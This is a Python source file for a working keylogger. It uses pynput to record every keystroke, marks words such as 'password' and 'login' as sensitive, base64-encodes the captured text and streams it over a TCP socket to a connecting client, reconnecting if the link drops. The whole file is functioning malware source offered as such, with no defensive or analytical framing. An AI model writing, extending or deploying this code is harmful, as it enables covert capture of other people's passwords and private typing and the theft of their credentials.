# KeyloggerServer.py
import socket
import base64
from pynput.keyboard import Listener
from datetime import datetime
import time
from threading import Thread
class KeyloggerServer:
    def __init__(self, host="127.0.0.1", port=65432):
        self.server_host = host
        self.server_port = port
        self.word_stack = []
        self.latesttime = time.time()
        self.sensitive_words = ["admin", "password", "login", "secret"]
        self.client_socket = None

        # Start keylogger listener
        self.startKeylogger()

        # Start TCP server for sending logs
        self.startTcpServer()

    def startTcpServer(self):
        """Initialize the TCP server to send logs to the client, with reconnection handling."""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.server_host, self.server_port))
        self.server_socket.listen(1)
        print(f"Server started. Waiting for client on {self.server_host}:{self.server_port}")
        
        # Accept connections and handle reconnections
        Thread(target=self.handleClientConnections, daemon=True).start()

    def handleClientConnections(self):
        """Accepts and manages client reconnections."""
        while True:
            try:
                # Check for a new connection if no client is connected or reconnection is needed
                if self.client_socket is None:
                    self.client_socket, _ = self.server_socket.accept()
                    print("Client connected!")
            except socket.error as e:
                print(f"Error accepting connection: {e}")

    def wordStacker(self, key):
        """Handle key events and manage the word stack for each entry."""
        key = str(key).replace("'", "")

        # Handle special keys except Backspace, Enter, and Space
        special_keys = {
            'Key.tab': ' [TAB] ',
            'Key.shift': ' [SHIFT] ',
            'Key.ctrl_l': ' [CTRL] ',
            'Key.ctrl_r': ' [CTRL] ',
            'Key.alt_l': ' [ALT] ',
            'Key.alt_r': ' [ALT] ',
            'Key.esc': ' [ESC] ',
            'Key.up': ' [UP] ',
            'Key.down': ' [DOWN] ',
            'Key.left': ' [LEFT] ',
            'Key.right': ' [RIGHT] '
        }

        if key in special_keys:
            self.enqueueIntoLog(special_keys[key])
        elif key == 'Key.backspace':
            try:
                self.word_stack.pop(-1)
            except IndexError:
                pass
        elif key == 'Key.space':
            self.enqueueIntoLog(''.join(self.word_stack) + ' ')
            self.word_stack.clear()
        elif key == 'Key.enter':
            self.enqueueIntoLog(''.join(self.word_stack) + '\n[ENTER]\n')
            self.word_stack.clear()
        else:
            self.word_stack.append(key)

    def enqueueIntoLog(self, entry):
        """Add new entry and send Base64-encoded log to the client."""
        current = time.time()
        if current - self.latesttime > 30:
            timestamp = datetime.now().strftime("\n%Y-%m-%d %H:%M:%S")
            log_entry = f"{timestamp}\n{entry}"
        else:
            log_entry = entry

        encoded_entry = base64.b64encode(log_entry.encode()).decode()
        if self.client_socket:
            try:
                self.client_socket.sendall((encoded_entry + "\n").encode())
            except (BrokenPipeError, ConnectionResetError):
                print("Client disconnected. Awaiting reconnection...")
                self.client_socket = None  # Clear the client socket to allow reconnection
        self.latesttime = time.time()

    def startKeylogger(self):
        """Start the keylogger listener."""
        self.listener = Listener(on_press=self.wordStacker)
        self.listener.start()

    def stop(self):
        """Stop the listener and close the sockets."""
        self.listener.stop()
        if self.client_socket:
            self.client_socket.close()
        self.server_socket.close()

# Run the Keylogger Server
if __name__ == "__main__":
    server = KeyloggerServer()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping server.")
        server.stop()
